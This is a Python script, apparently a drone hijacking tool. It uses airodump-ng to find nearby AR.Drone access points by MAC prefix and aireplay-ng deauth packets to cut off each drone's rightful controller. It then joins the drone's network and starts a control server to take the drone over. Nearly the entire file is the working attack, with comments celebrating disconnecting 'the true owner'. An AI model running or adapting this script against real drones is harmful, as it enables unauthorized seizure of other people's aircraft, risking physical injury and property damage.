import subprocess
import time
import re
import server
import os




def find_drone(mac, drones):
#This function takes to arguments mac address and an array of the drones with their mac addresses
# the function returns the drone object by finding its mac address in the array
	for d in drones:
		
		if mac in d:
			return d
	return 'Not found'


def execute(cmd):
	#this function recieves a command and runs it using os.system() function
	print "Running " + cmd 
	os.system(cmd)
	return
	

def execute2(cmd):
	#this function takes a command and runs it in the background 
	print "Running " + cmd 
	return subprocess.Popen(cmd, shell=True)


def main():
	tmpfile = "/tmp/dronestrike" #temp file to save the output of airodump library
	drone_macs = ['90:03:B7','A0:14:3D',  '00:12:1C', '00:26:7E'] #Array of the first 6 bytes that are in the mac addresses of any drone
	#These values are found in the drone manual
	interface  = "wlan5" #The name of the first wireless interface that I will use it to hijack
	interface2 = "wlan7" #The name of the second interface to control the hijacked drone

	# paths to applications
	dhclient	= "dhclient"
	iwconfig	= "iwconfig"
	ifconfig	= "ifconfig"
	airmon	= "airmon-ng"
	aireplay	= "aireplay-ng"
	aircrack	= "aircrack-ng"
	airodump	= "airodump-ng"


	execute(ifconfig +' ' + interface +' down') #pu the interface down 	
	airmon_process = execute(airmon + ' start ' + interface) #putting interface in the monitor mode 



	mon_interface = 'mon0'
	cmd1 = 'sudo %s --output-format csv -w %s %s >>/dev/null 2>>/dev/null' %(airodump, tmpfile,interface)
	print cmd1 #running the airmonitor tool to capture all traffic in the air that we will analyze it later on
	airodump_process = execute2(cmd1)
	print airodump_process.pid
	time.sleep(3) # wait 3 seconds ... enough time to capture almost all wireless connections
	execute('sudo kill '+str(airodump_process.pid))
	time.sleep(1)
	execute('sudo kill -HUP ' +str(airodump_process.pid))
	time.sleep(1)
	execute('sudo kill -9 ' + str(airodump_process.pid))
	time.sleep(1)
	execute('sudo killall -9 ' + aireplay + ' '+ airodump)
	#make sure that airmonitor is killed

	my_drone = '90:03:B7:34:3B:02' #This is the make address of my drone so that I do NOT hijack myself
	#TO-DO make this variable an array that contains my drone and all hijacked drones, so whenever I hijcak one I don't hijack it again
	f = open(tmpfile+'-01.csv', 'rb') #reading the output of air-monitor tool 
	tmp_file = f.read()
	drones = []
	for mac in drone_macs: #finding all drones in the air
		pattern = '^(%s.[\w:]+),\s+\S+\s+\S+\s+\S+\s+\S+\s+(\d+),.*(ardrone\S+),' %(mac)
		val = re.findall(pattern ,tmp_file, re.MULTILINE)
		drones += val


	clients =[] 

	for mac in drone_macs: #finding all clients connected to the drones
		pattern = '^([\w:]+).*\s(%s.[\w:]+),' % (mac)
		val = re.findall(pattern, tmp_file, re.MULTILINE)
		clients += val
	
	print "Found %i drone(s)" %(len(drones))
	for d in drones:
		print d # printing the result 

	#raw_input("press Enter to Continue")

	# if len(drones) == 0:
	# 	print "No drones \nexitting ..."
	# 	return 

	print "Found %i client(s)" %(len(clients))
	for c in clients:
		print c #printing the clients 

	#raw_input("press Enter to Continue")

	execute('sudo rm '+tmpfile+'-01.csv')
	#removing the temp file


	# now, disconnect the TRUE owner of the drone.
	for c in clients:
		if(c[0])=='BSSID': #sometimes the air-mon tool returns an empty client has the word BSSID so this if condition to bypass that glitch
			continue
		d = find_drone(c[1], drones)
		print "Found client (" + str(c[0]) + ") connected to " + str(d)

		#res = raw_input("You want to disconnect the client?? [Y/N]\n")

		#if res == 'Y' or res =='y':

		#after finding the connected drone, excluding mine, I will start to send the de-auth packets
		if my_drone not in d: #
			cmd = 'sudo ' + iwconfig + ' ' + interface + ' channel ' + str(d[1])
			#print cmd
			execute(cmd)
			time.sleep(2)
			print "Disconnecting the true owner of the drone ;)\n\n"
			cmd = aireplay + " -0 20 -a " + str(d[0])+ " -c " + str(c[0]) + " "+ interface
			#print cmd
			execute(cmd)

	time.sleep(2)
	airmon_process = execute(airmon + ' stop  mon0') #Disabling the monitor mode 

	# connect to each drone and run our zombie client!
	for d in drones:
		#res = raw_input("You want to connect to the drone  ?? [Y/N]")
		#if res == 'Y' or res =='y':
		if my_drone not in d:
			print "\n\nConnecting to the hijacked drone\n"
			cmd = "sudo "+iwconfig+" "+interface2+" essid " +d[2]
			#print cmd
			execute(cmd)

			print "Acquiring IP from drone for hostile takeover\n"
		
			cmd = "sudo " +ifconfig+" "+interface2+ " 192.168.1.10"
			#setting the up statically, because sometimes the drone rejects to give us an IP using the dhcp server installed on the drone

			execute(cmd)

			execute('reset')
			execute('clear')
			print "\t\t\tTAKING OVER DRONE\n"
			server.server('192.168.1.1', 6665) #connecting to the drone server that is on ip 192.168.1.1 and make the panda board
			#a server listenning on port 6665 for any coming commands to control the drone
			#The panda board is like a gateway to the drone

if __name__ == '__main__':
	main()
